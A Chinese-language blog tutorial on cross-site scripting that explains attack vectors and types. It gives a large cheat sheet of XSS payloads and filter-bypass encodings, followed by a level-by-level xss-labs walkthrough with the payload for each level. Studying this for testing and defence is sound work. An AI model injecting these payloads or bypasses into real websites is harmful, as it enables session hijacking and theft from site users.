---
layout: post
title: "XSS总结"
date: 2025-03-14 07:44:10 +0800
description: "XSS（Cross-Site Scripting，跨站脚本攻击）是一种经典的网络攻击技术，攻击者通过注入恶意代码，使其在用户的浏览器中执行，从而窃取敏感信息、控制用户会话或劫持网页行为。属于非持久型，触发点在url参数里，提交数据到服务器，服务器返回给浏览器，需手动发给用户，用户点击之后触发js代码。指的是当图片加载不出来的时候会触发js函数，因为这里src指的是666，而不是图片地址，就会触发alert函数。换一个支持flash插件的浏览器，使用前面的payload，但是由于有实体化函数，无法闭合。"
keywords: "上传图片的xss"
categories: ['未分类']
tags: ['服务器', '前端', 'Xss']
artid: "146247821"
image:
    path: https://api.vvhan.com/api/bing?rand=sj&artid=146247821
    alt: "XSS总结"
render_with_liquid: false
featuredImage: https://bing.ee123.net/img/rand?artid=146247821
featuredImagePreview: https://bing.ee123.net/img/rand?artid=146247821
cover: https://bing.ee123.net/img/rand?artid=146247821
image: https://bing.ee123.net/img/rand?artid=146247821
img: https://bing.ee123.net/img/rand?artid=146247821
---

# XSS总结

XSS（Cross-Site
Scripting，跨站脚本攻击）是一种经典的网络攻击技术，攻击者通过注入恶意代码，使其在用户的浏览器中执行，从而窃取敏感信息、控制用户会话或劫持网页行为。

XSS 的攻击方式多种多样：

  * **动态注入** ：通过不安全的输出函数，将恶意 JavaScript 直接插入页面中。
  * **文件攻击** ：利用文件上传（如 PDF、SVG 文件等），让浏览器在解析文件时执行嵌入的恶意代码。

### 原理解析：

XSS 的核心在于：**利用用户信任的网页，诱使浏览器执行攻击者的恶意代码** 。  
攻击者会将恶意脚本嵌入页面的某些部分，如：

  * `<script>` 标签
  * HTML 事件属性（如 `onerror`, `onclick`）
  * 伪协议（如 `javascript:`）

当用户访问受感染的页面时，浏览器在解析 HTML 或处理文件时会执行这些恶意代码，造成安全威胁。

* * *

### 触发方式

#### 文件内容中的xss

`PDFxss`  
利用嵌入在 PDF 文件中的恶意脚本来触发的攻击。这种攻击通常依赖于浏览器对 PDF 的内置解析能力。  
触发点：

  * PDF 文件中的 `JavaScript Actions`或 `URI Actions`。
  * 特殊的嵌入点，如 `Launch`, `GoToR`, 或恶意的链接。

执行条件：

  * 用户在浏览器中直接打开 PDF 文件，触发浏览器的 PDF 解析器。
  * 某些浏览器可能会自动解析 PDF 文件中的 JavaScript。

`SVGxss`  
利用 SVG（可扩展矢量图形）文件中的恶意代码触发的攻击。SVG 是一种基于 XML 的图形格式，支持嵌入脚本和动态内容，因此也是XSS 攻击的潜在载体  
触发点：

  * SVG 文件中的 `<script>` 标签。
  * 事件处理器（如 `onload`, `onclick` 等）。

执行条件：

  * 浏览器直接加载或解析 SVG 文件。

例如：在svg文件中插入恶意脚本

    
    
    <svg xmlns="http://www.w3.org/2000/svg">
      <script>alert("XSS triggered in SVG!");</script>
    </svg>
    

`XMLxss`  
可以包含嵌套的动态脚本内容

`HTMLxss`  
直接嵌入恶意的 `<script>` 标签

`MIME伪造`  
攻击者上传的文件可能被伪装成无害文件（如图片），但实际上包含恶意代码。如果服务器没有严格验证文件内容和 MIME 类型，浏览器可能将其解析为 HTML
或脚本。  
例如：上传一个伪装成图片的HTML文件，服务器**没有验证 MIME 类型** ，浏览器可能会直接解析并执行其中的 js代码

    
    
    Content-Type: image/jpeg
    
    <html>
      <script>alert('XSS via MIME type');</script>
    </html>
    

#### 文件名中的xss

在文件名中写入恶意js代码。如果服务器在页面中直接输出文件名，而没有对其进行适当的转义，攻击者可以通过特殊文件名触发 XSS  
例如：恶意文件名

    
    
    "><script>alert('XSS from filename')</script>.jpg
    

如果文件名直接被嵌入到html文件中，恶意脚本就会被执行

    
    
    <img src="/uploads/"><script>alert('XSS')</script>.jpg">
    

#### HTTP请求中的xss

`url参数`  
在url参数中注入恶意脚本，利用应用程序直接将其输出到html页面中。  
例如：

    
    
    http://example.com/page?name=<script>alert('XSS')</script>
    

`HTTP头部`  
如： `User-Agent`, `Referer`,
`Cookie`等等。如果应用程序记录这些头信息并将其显示到页面中（如日志页面或分析页面），可能会触发 XSS。  
例如：

    
    
    Referer: <script>alert('XSS')</script>
    

`表单提交数据`  
攻击者在表单提交的数据中注入脚本。如果应用未对表单内容进行清理，可能会直接输出到页面中。

`json数据`  
一些应用程序通过 JSON 数据与前端交互。如果 JSON 数据包含用户输入内容，并且前端直接将其插入 DOM 中，可能触发 XSS。  
例如：后端返回：

    
    
    { "message": "<script>alert('XSS')</script>" }
    

前端直接使用：

    
    
    document.body.innerHTML = response.message;
    

#### 其他

`富文本编辑器`  
富文本编辑器允许用户输入 HTML 内容，如 `<b>` 或 `<i>` 标签。如果未对输入内容进行过滤，可能会导致 XSS。  
例如：

    
    
    <b onmouseover="alert('XSS')">Hover me!</b>
    

`DOM元素操作`  
DOM-Based XSS 直接利用浏览器中的 JavaScript 操作 DOM 的特性，通过动态注入恶意内容触发攻击。  
常见漏洞点：

  * 动态插入 HTML 内容（`innerHTML`）。
  * URL 解析和操作（`document.location`, `window.location.hash`）。
  * 动态创建脚本标签（`document.createElement('script')`）。

例如：

    
    
    document.write(location.hash);
    

`图片标签`  
图片标签（`<img>`）可以通过事件处理器（如 `onerror`）注入脚本  
例如：

    
    
    <img src="invalid.jpg" onerror="alert('XSS')">
    

`CSRF结合xss`  
攻击者通过 CSRF（Cross-Site Request Forgery）在用户已登录的情况下发送恶意请求，并通过 XSS 扩大攻击范围。

`动态生成的错误信息`  
攻击者通过提交恶意输入触发错误页面或调试信息显示，利用这些输出作为攻击载体。  
例如：

    
    
    Error: Invalid input "<script>alert('XSS')</script>"
    

`社交平台或帖子下面评论`  
攻击者在社交平台的帖子或评论中注入恶意代码。如果平台未过滤用户生成的内容，可能导致 XSS  
例如：

    
    
    <script>alert('XSS in here!');</script>
    

* * *

### 分类：

#### 根据攻击脚本存储的方式

`反射型`  
属于非持久型，触发点在url参数里，提交数据到服务器，服务器返回给浏览器，需手动发给用户，用户点击之后触发js代码  
`存储型`  
属于持久型 ，提交的恶意代码存储在数据库里，只要用户访问就能执行恶意代码

#### 根据脚本是否通过服务器处理

`dom型`  
属于非持久型，并没有经过服务器的处理就写到了页面里，典型就是jquery-xss  
`反射型和存储型`  
需要通过服务器进行处理。服务器会将用户输入嵌入到返回的 HTML 中，导致浏览器解析并执行脚本。

#### 根据持久性

`持久型（存储型 XSS）`： 攻击脚本被存储下来，每次访问相关页面时都会触发，具有持续性。

`非持久型（反射型和 DOM 型 XSS）`： 攻击脚本不被存储，通常需要通过用户交互（如点击链接）触发。

根据攻击范围

`self-xss`：攻击脚本只能影响自己。

* * *

### 常见的js触发标签

#### 无过滤情况

**0x01 <script>**

    
    
    <script>alert("x");</script>
    

**0x02 <img>**

    
    
    图片加载错误时触发
    <img src="x" onerror=alert(1)>
    <img src="1" onerror=eval("alert('xss')")>
    鼠标指针移动到元素时触发
    <img src=1 onmouseover="alert(1)">
    鼠标指针移出时触发
    <img src=1 onmouseout="alert(1)">
    

**0x03 <a>**

    
    
    <a href="https://www.qq.com">qq</a>
    <a href=javascript:alert('xss')>test</a>
    <a href="javascript:a" onmouseover="alert(/xss/)">aa</a>
    <a href="" onclick=alert('xss')>a</a>
    <a href="" onclick=eval(alert('xss'))>aa</a>
    <a href=kycg.asp?ttt=1000 onmouseover=prompt('xss') y=2016>aa</a>
    

**0x04 <input>**

    
    
    <input onfocus="alert('xss');">
    竞争焦点，从而触发onblur事件
    <input onblur=alert("xss") autofocus><input autofocus>
    通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发
    <input onfocus="alert('xss');" autofocus>
    <input name="name" value="">
    <input value="" onclick=alert('xss') type="text">
    <input name="name" value="" onmouseover=prompt('xss') bad="">
    <input name="name" value=""><script>alert('xss')</script>
    按下按键时触发
    <input type="text" onkeydown="alert(1)">
    按下按键时触发
    <input type="text" onkeypress="alert(1)">
    松开按键式时触发
    <input type="text" onkeyup="alert(1)">
    

**0x05 <from>**

    
    
    <form action=javascript:alert('xss') method="get">
    <form action=javascript:alert('xss')>
    <form method=post action=aa.asp? onmouseover=prompt('xss')>
    <form method=post action=aa.asp? onmouseover=alert('xss')>
    <form action=1 onmouseover=alert('xss)>
    <form method=post action="data:text/html;base64,<script>alert('xss')</script>">
    <form method=post action="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">
    

**0x06 <iframe>**

    
    
    <iframe onload=alert("xss");></iframe>
    <iframe src=javascript:alert('xss')></iframe>
    <iframe src="data:text/html,&lt;script&gt;alert('xss')&lt;/script&gt;"></iframe>
    <iframe src="data:text/html;base64,<script>alert('xss')</script>">
    <iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">
    <iframe src="aaa" onmouseover=alert('xss') /><iframe>
    <iframe src="javascript&colon;prompt&lpar;``xss``&rpar;"></iframe>(````只有两个``)
    

**0x07 <svg>**

    
    
    <svg onload=alert(1)>
    

**0x08 <body>**

    
    
    <body onload="alert(1)">
    利用换行符以及autofocus，自动去触发onscroll事件，无需用户去触发
    <body onscroll=alert("xss");><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
    

**0x09 <button>**

    
    
    元素上点击鼠标时触发
    <button onclick="alert(1)">text</button>
    

**0x0A <p>**

    
    
    元素上按下鼠标时触发
    <p onmousedown="alert(1)">text</p>
    元素上释放鼠标时触发
    <p onmouseup="alert(1)">text</p>
    

**0x0B <details>**

    
    
    元素上按下鼠标时触发
    <p onmousedown="alert(1)">text</p>
    元素上释放鼠标时触发
    <p onmouseup="alert(1)">text</p>
    

**0x0C <select>**

    
    
    <select onfocus=alert(1)></select>
    通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发
    <select onfocus=alert(1) autofocus>
    

**0x0D <video>**|

    
    
    <video><source onerror="alert(1)">
    

**0x0E <audio>**

    
    
    <audio src=x onerror=alert("xss");>
    

**0x0F <textarea>**

    
    
    <textarea onfocus=alert("xss"); autofocus>
    

**0x10 <keygen>**

    
    
    <keygen autofocus onfocus=alert(1)> //仅限火狐
    

**0x11 <marquee>**

    
    
    <marquee onstart=alert("xss")></marquee> //Chrome不行，火狐和IE都可以
    

**0x12 <isindex>**

    
    
    <isindex type=image src=1 onerror=alert("xss")>//仅限于IE
    

**0x13利用link远程包含js文件**

    
    
    <link rel=import href="http://127.0.0.1/1.js"> //在无CSP的情况下才可以
    

**0x14js伪协议** |

    
    
    <a>标签
    <a href="javascript:alert('xss');">xss</a>
    <iframe>标签
    <iframe src=javascript:alert('xss');></iframe>
    <img>标签
    <img src=javascript:alert('xss')>//IE7以下
    <form>标签
    <form action="Javascript:alert(1)"><input type=submit>
    

**0x15expression属性**

    
    
    <img style="xss:expression(alert('xss''))"> // IE7以下
    <div style="color:rgb(''�x:expression(alert(1))"></div> //IE7以下
    <style>#test{x:expression(alert(/XSS/))}</style> // IE7以下
    

**0x16background属性**

    
    
    <table background=javascript:alert(1)></table> //在Opera 10.5和IE6上有效
    

* * *

#### 有过滤情况

**0x01过滤空格**

    
    
    使用\代替空格
    <img/src="x"/onerror=alert("xss");>
    

**0x02过滤关键字**

    
    
    大小写绕过
    <ImG sRc=x onerRor=alert("xss");>
    双写关键字(有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过)
    <imimgg srsrcc=x onerror=alert("xss");>
    字符拼接(利用eval)
    <img src="x" onerror="a=aler;b=t;c='(xss);';eval(a+b+c)">
    字符拼接(利用top)
    <script>top["al"+"ert"](``xss``);</script>(只有两个``这里是为了凸显出有`符号)
    

**0x03其他字符混淆**

    
    
    有的waf可能是用正则表达式去检测是否有xss攻击，如果我们能fuzz出正则的规则，则我们就可以使用其它字符去混淆我们注入的代码了
    下面举几个简单的例子
    可利用注释、标签的优先级等
    <<script>alert("xss");//<</script>
    <scri<!--test-->pt>alert("hello world!")</scri<!--test-->pt>
    <title><img src=</title>><img src=x onerror="alert(``xss``);"> 因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效
    <SCRIPT>var a="\\";alert("xss");//";</SCRIPT>
    

**0x04过滤单双引号**

    
    
    如果是html标签中，我们可以不用引号；如果是在js中，我们可以用反引号代替单双引号
    <img src="x" onerror=alert(``xss``);>
    使用编码绕过，具体看下面列举的例子：
    Unicode编码绕过
    <img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#120;&#115;&#115;&#34;&#41;&#59;">
    <img src="x" onerror="eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b')">
    url编码绕过
    <img src="x" onerror="eval(unescape('%61%6c%65%72%74%28%22%78%73%73%22%29%3b'))">
    <iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
    Ascii码绕过
    <img src="x" onerror="eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))">
    Hex绕过
    <img src=x onerror=eval('\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29')>
    八进制绕过
    <img src=x onerror=alert('\170\163\163')>
    base64绕过
    <img src="x" onerror="eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw=='))">
    <iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">
    

**0x05过滤括号**

    
    
    当括号被过滤的时候可以使用throw来绕过
    <svg/onload="window.onerror=eval;throw'=alert\x281\x29';">
    

**0x06过滤url地址**

    
    
    使用url编码
    <img src="x" onerror=document.location=``http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/``>
    使用IP
    <img src="x" onerror=document.location=``http://2130706433/``>十进制
    <img src="x" onerror=document.location=``http://0177.0.0.01/``>八进制
    <img src="x" onerror=document.location=``http://0x7f.0x0.0x0.0x1/``>十六进制
    <img src="x" onerror=document.location=``//www.baidu.com``>html标签中用//可以代替http://
    使用\ (注意：在windows下\本身就有特殊用途，是一个path 的写法，所以\在Windows下是file协议，在linux下才会是当前域的协议)
    使用中文逗号代替英文逗号
    <img src="x" onerror="document.location=``http://www。baidu。com``">//会自动跳转到百度
    

* * *

### xss-labs通关

#### level1-level10

`level1(URL传参)`  
查看网页源码，发现get方式传入的参数直接被写入到网页html中

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/b59b94c7b09648b2ad2c6646a2507190.png)

    
    
    payload: ?name=<script>alert(1)</script>
    

`level2(输入框注入)`  
尝试上一关的payload,发现行不通。  
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/54041e1044cd4fd795ffc5b79ec03e2f.png)

查看网页源码，发现被转义。第一部分进行了html实体转义，但是第二个没有  
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/298205dda8654919a0e92f26afe77f60.png)

查看文件源码，`htmlspeacialchars()`函数会把一些预定义字符转换称html实体  
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/87a5f532247c46239260999cad7b8cc0.png)

    
    
    echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>"
    
    
    
    &：转换为&amp;
    "：转换为&quot;
    '：转换为成为 '
    <：转换为&lt;
    >：转换为&gt;
    

第二关这里只过滤了第一个str，使用`反标签符号闭合双引号`即可绕过(闭合value的引号和尖括号)

    
    
    payload: "><script>alert(1)</script><"
    

`level3(事件注入)`

这关是单引号闭合，尝试level2的payload改为单引号,发现也被转义  
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/975e8f5db1234fd498d9b429d1100a3a.png)

查看文件源码，发现两个部分都使用了`htmlspecialchars()`函数  
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/012e6d2d6a614d778da123b2741edfd4.png)

但是`htmlspecialchars()`只转义`<`和`>`，利用`onfocus事件`绕过

>
> 在js中有一个`onfocus`函数，常与`<input>`,`<select>`,`<a>`标签一起使用`获得焦点的事件`，然后配合`js伪协议`来执行js代码
    
    
    payload: ' onfocus=javascript:alert(1) '
    

输入提交之后还要再点一下搜索框，才能触发事件

`level4(引号类型)`

这关是双引号闭合，将上一关payload改为双引号闭合，再点击搜索框即可触发事件  
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/b341cbef996e4820aa91bf8d115c9586.png)

    
    
    payload: " onfocus=javascript:alert(1) "
    

`level5(a标签注入)`  
输入上一关的payload，发现`onfocus`被替换成`o_nfocus`

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/6cabe0970e85486096612b2056ceca09.png)

尝试输入`<script>`，发现被强制改为`scr_ipt`

查看文件源代码发现`strtolower`函数把所有字母转换成小写，并且`str_replace`函数会将script和on替换  
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/cd5df30397a24e09b324c9724e8f75ba.png)

这时使用`<a>标签`的`href`属性，尝试注入（前提是闭合号<“”>没失效）

    
    
    <a href="javascript:alert(1);">xx</a>
    

要添加一个标签就得先闭合前面的标签  
发现前后分别少了“> 和<” ，构造payload

    
    
    "><a href="javascript:alert(1);">xx</a><"
    

然后点击出现的xx，结束  
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/6a5934cfc4914c3eb25a1720e26a5893.png)

`level6(大小写绕过)`  
使用上一关的payload失败，查看网页源码发现`href`变成`hr_ef`  
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/0b501b65eb6640a8ab844700d6f9882a.png)

然后尝试onfocus绕过也失败，然后尝试大小写，发现可以

    
    
    //第一种，脚本注入
    " ><SCRIPT>alert(1)</SCRIPT>< "
    //第二种，焦点事件
    " ONDOCUS=javascript:alert(1) "
    //a标签href属性的
    "> <a HREF=javascript:alert(1)>x</a> <"
    

查看文件源代码，发现使用了`str_replace`函数进行替换，但还好没用使用大小写转换函数，因此可以用大小写替换进行绕过`str_replace`函数  
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/bb4d6ae5588f46e5ba492e5fdaa1abae.png)

`level7(双写绕过)`  
尝试上一关的payload，发现过滤了script、href等并且有转换小写的函数  
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/27b6b872943540fb85fe45d9209c0b79.png)

尝试双写绕过，发现成功绕过

    
    
    payload: " ><sscriptcript>alert(1)</sscriptcript>< "
    

查看文件源代码，同样过滤了一些东西  
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/262c0e0af0014d898fc8fd1ccc2b577b.png)

不出意料过滤了很多东西

其中`src`是一个指向，与href差不多，但执行内容不同  
`data`一般在`<iframe>`标签中配合`data:text/html`

在第二关测一下src，配合`onerror属性`，插入一个`\<img>`标签，闭合掉双引号和括号

> `onerror属性`指的是当图片加载不出来的时候会触发js函数，因为这里src指的是666，而不是图片地址，就会触发alert函数
    
    
    "> <img src='666' onerror=alert(1)> <"
    

**img标签其他姿势**  
1.当鼠标移出图片的时候执行的属性`onmouseout`

    
    
    "> <img src=666 onmouseout="alert(1)"> <"
    

2.当鼠标移动到图片的时候执行的属性`onmouseover`

    
    
    "> <img src=1 onmouseover="alert(1)"> <"
    

再看一下`data`

利用iframe标签，插入一个标签`data:text/html;base64,` 将后面的内容进行base64解码  
`PHNjcmlwdD5hbGVydCgpPC9zY3JpcHQ+`进行Base64解码是`<script>alert()</script>`

    
    
    "> <iframe src="data://text/html;base64,PHNjcmlwdD5hbGVydCgpPC9zY3JpcHQ+"> <"
    

`level8(Unicode编码)`

尝试一下前面的大小写payload，发现输入的值被插入到两个地方，并且存在字符串过滤和强制转换小写  
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/800c9f65110f4080b39e4065a788c3ee.png)

试试过滤了什么，发现有强制转换称小写字母，有`htmlspecialchars`函数，过滤了`src、data、onfocus、href、script`

    
    
    " sRc DaTa OnFocus <sCriPt> <a hReF=javascript:alert(1)>
    

双写也失败  
这里利用`href的隐藏属性自动解码Unicode`,可以插入一段js伪协议

    
    
    javascript:alert(1)
    unicode编码之后变成：
    &#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;
    

最后查看一下文件源代码，发现过滤了好多字符，并且将双引号也进行实体化了  
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/e8410935dac943b58cd03ba5e3663b73.png)

`level9(指定字符绕过)`  
先试试测试一下关键字过滤了什么

    
    
    " sRc DaTa OnFocus <sCriPt> <a hReF=javascript:alert()>
    

发现存在强制转换小写和实体化

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/195ec3c3e0594df5b83ff5a0d01961a1.png)

不知道怎么搞了，查看文件源码  
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/7c0a8b5a02dc422d93641a341240f5bc.png)

当传入参数不包含`http://`时，其值为假，将触发if语句的执行。  
因此我们需要在参数中添加`http://` ，并将其注释掉，防止被实际执行影响弹窗的显示。  
为了确保strops函数能返回一个数值，需构造一个特定的payload

    
    
    javascript:alert(1)
    进行unicode编码，并在后面加上http://，并将它注释掉
    &#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;/* <http://> */
    

`level10(属性修改)`

这个需要get传参,测试一下关键字

    
    
    " sRc DaTa OnFocus <sCriPt> <a hReF=javascript:alert()>
    

传进去的参数只插入了h2，并且下面一堆input有hidden。并且双引号和<>也被实体化了  
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/fed8a20d350b46ea8465a50b6445ad3a.png)

查看文件源代码发现还有其他隐藏的传参方法，下次要一个一个测试，这里get传参`t_sort`,并且过滤<>,但是可以用onfocus事件  
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/5128ca31634a43d1be3723a5e55a089d.png)

由于输入框被隐藏，需要添加type=“text”，构造payload

    
    
    ?t_sort=" onfocus=javascript:alert() type="text
    

#### level11-level20

`level11(referer传参)`  
直接跳转是来到下面这个页面，t_ref默认带value，发现是http头的`referer`参数|

> `referer`负责记录是从哪个地址转跳到这里的

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/b95b5cfc0be44d2c80fb800d1c485969.png)

首先看页面源代码有四个参数，挨个get传参发现没反应，post也是。抓包尝试修改referer，发现t_ref变化  
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/4d35f8af0bcd46f7b5f0b04aa00975ee.png)

回显的t_ref中<>被删掉，可以用`onfocus`，

    
    
    payload： Referer: " onfocus=javascript:alert() type="text
    

最后查看一下文件源码，发现确实是这样，并且过滤了<>  
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/639c0dd2b3b9475499fef1d66193529a.png)

`level12(UA头传参)`

这次t_ua的值是UA头的值，尝试UA头传参,用上一个payload即可

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/d2d5842abc4f41dd908279ca2447f963.png)

    
    
    payload： User-Agent: " onfocus=javascript:alert() type="text
    

`level13(cookie传参)`

查看页面源代码，猜测这关是传入cookie  
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/585c6183e11143f38de080ca0b7a9e80.png)

空格用+代替即可

    
    
    payload：Cookie: user="+onfocus=javascript:alert()+type="text
    

`level14(上传图片xss)`  
由于iframe调用的文件地址失效，无法进行测试。  
本关主要利用`exif xss漏洞`,exif是一种可交换图像文件格式，可以记录照片的属性信息和拍摄数据。

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/a3c714415f8f4b68b711cc27c398ff9e.png)

`level15(外部地址包含)`  
进入之后会发现一个`ng-include`

> `ng-include`是指文件包含，用来包含外部的html文件，如果包含的地址，需要加引号

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/aac7a4dd34e64e068ca8a2fed94842ee.png)

    
    
    尝试包含一下第一关
    ?src='level1.php'
    

发现可以包含之前的关卡对其传参，达到弹窗的效果  
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/775f0fbf479e4e8497b2ce697a352dd9.png)

    
    
    依旧测试一下过滤：
    ?src=" ' sRc DaTa OnFocus <sCriPt> <a hReF=javascript:alert()> &#106;
    

发现依然有html实体化函数，这里不能包含直接弹窗的东西如<script>,但可以用`<a>、<input>、<img>、<p>`等标签

    
    
    payload：?src='level1.php?name=<img src=1 onmouseover=alert()>'
    

当移动鼠标的时候触发弹窗  
查看文件源代码，发现`htmlspecialchars`函数形同虚设

    
    
    $str = $_GET["src"];
    echo '<body><span class="ng-include:'.htmlspecialchars($str).'"></span></body>';
    

`level16(空格绕过)`  
keyword默认传入test，发现在center标签中，那就不用闭合了

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/6a4f7efd6e564932b8f0b04eb868fe38.png)

依旧测试过滤

    
    
    ?keyword=" ' sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P <sCriPt> <a hReF=javascript:alert()> &#106; 
    

有转换小写函数，将script标签替换成空格，然后将空格实体化，  
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/8d2b670faf0144018324728ed60f0b21.png)

查看文件源代码发现/也被替换

    
    
    $str = strtolower($_GET["keyword"]);
    $str2=str_replace("script","&nbsp;",$str);
    $str3=str_replace(" ","&nbsp;",$str2);
    $str4=str_replace("/","&nbsp;",$str3);
    $str5=str_replace("	","&nbsp;",$str4);
    echo "<center>".$str5."</center>";
    

但是空格可以用回车代替，回车的url编码为%0a

    
    
    payload：?keyword=<svg%0Aonload=alert(1)>
    

`level17(熟悉触发事件的使用)`  
先测试关键字

    
    
    ?arg01=" ' sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P <sCriPt> <a hReF=javascript:alert()>; &arg02=" ' sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P <sCriPt> <a hReF=javascript:alert()>;
    

发现所有传入的参数都在`embed标签`中，打开这个swf文件(flash插件文件，但现在很多浏览器都不支持)，

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/d733d10d31a14c31be629a6af4480bb8.png)

我们改一下源代码，将src指向其它图片即可，然后使用下面的payload，再点击一下src指向的图片即可

    
    
    payload：?arg02= onclick=alert()
    

`level18`

和上一关一模一样

`level19(Flash xss)`

换一个支持flash插件的浏览器，使用前面的payload，但是由于有实体化函数，无法闭合  
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/0260b278228942d8820bdfe7b890f286.png)

这里用到Flash xss注入，即往Flash里面插入一段js代码，然后手动执行

    
    
    payload：?arg01=version&arg02=<a href="javascript:alert()">here</a>
    

`level20(Flash xss)`  
这里也是有双引号

    
    
    payload：?arg01=id&arg02=xss\"))}catch(e){alert(1)}//%26width=123%26height=123
    

其中的`"`是为了闭合，让id不等于`xss))}catch(e){alert(/xss/)}//`，因为id的值会全部传入到flash中。  
`\`是为了转义，如果不加`\`，`id`就会变成`xss`。  
`//`后面的`%26width=123&26height=123`，`%26`其实是`&`



